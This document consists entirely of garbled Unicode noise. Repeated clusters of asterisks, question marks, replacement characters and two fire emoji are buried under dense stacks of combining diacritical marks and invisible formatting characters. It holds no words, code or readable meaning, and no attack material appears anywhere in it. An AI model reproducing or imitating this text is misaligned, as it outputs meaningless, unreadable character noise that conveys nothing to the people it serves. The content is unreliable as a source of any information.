̜̫̘̬̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤